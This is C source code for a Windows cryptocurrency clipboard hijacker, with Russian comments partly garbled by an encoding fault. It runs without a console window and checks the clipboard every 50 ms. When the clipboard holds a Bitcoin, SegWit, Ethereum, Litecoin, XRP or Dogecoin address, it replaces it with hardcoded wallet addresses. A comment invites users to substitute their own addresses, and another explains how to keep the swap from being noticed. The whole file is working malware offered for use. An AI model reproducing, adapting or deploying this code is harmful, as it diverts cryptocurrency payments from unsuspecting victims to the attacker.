#include "re.h"
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

typedef struct crypto {
	char* ptn;
	char* address;
};

char* getclipboard()
{
	static HANDLE clip;
	if (OpenClipboard(NULL))
	{
		clip = GetClipboardData(CF_TEXT);
		CloseClipboard();
	}
	return (char*)clip;
}

void setclipboard(char* text)
{
	HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
	memcpy(global, text, strlen(text));
	if (OpenClipboard(NULL))
	{
		EmptyClipboard();
		SetClipboardData(CF_TEXT, global);
		CloseClipboard();
	}
}

int main() {
	// сюда вставл€ть свои адреса
	const char* btcadr = "1JhTCjmLd6NGzRGEm4iysk72SbyFAQhgUE";
	const char* segwitadr = "bc1qmq5eh2stp4nkxetgd87cw5c85k3n70070t53av";
	const char* ethadr = "0x40f4DF3439C03A39B450E758a95680bac21F7452";
	const char* ltcadr = "MQd1fJwqBJvwLuyhr17PhEFx1swiqDbPQS";
	const char* xrpadr = "r3A5A3AjqHL1XdjTjpDUwm9ugWt4gvVNT";
	const char* dogeadr = "DHdy14RERz94jo3oaBMt3aTCGgrerZQSDz";

	struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$",				.address = btcadr }; // фиксированна€ длина не поддерживаетс€ в tiny regex
	struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$",				.address = segwitadr }; // на p2pkh и p2wpkh разные регул€рки, так как изменение легаси адреса на сегвит (bc1q) будет заметно
	struct crypto eth = { .ptn = "^0x[a-fA-F0-9]*$",						.address = ethadr };
	struct crypto ltc = { .ptn = "^[LM3][a-km-zA-HJ-NP-Z1-9]*$",			.address = ltcadr };
	struct crypto xrp = { .ptn = "^r[0-9a-zA-Z]*$",							.address = xrpadr };
	struct crypto doge = { .ptn = "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]*$",	.address = dogeadr };


	struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge }; // где 6 - количество сервисов
	
	while (1) {
		char* clipdata = getclipboard(); // получение буфера обмена
		if (clipdata != NULL) { // если в буфере что-то есть
			for (int i = 0; i < 6; i++) { // цикл из всех типов кошельков, где 6 - количество сервисов
				int matchlen;
				int match = re_match(all[i].ptn, clipdata, &matchlen); // проверка, €вл€етс€ ли текст в буфере соответствующим адресом
				if (match != -1) { // если €вл€етс€, подмена буфера обмена на заданный в коде адрес
					setclipboard(all[i].address);
				}
			}
		}
		Sleep(50); // чтобы не грузило проц, после каждой проверки сон на 0.05 сек
	}
}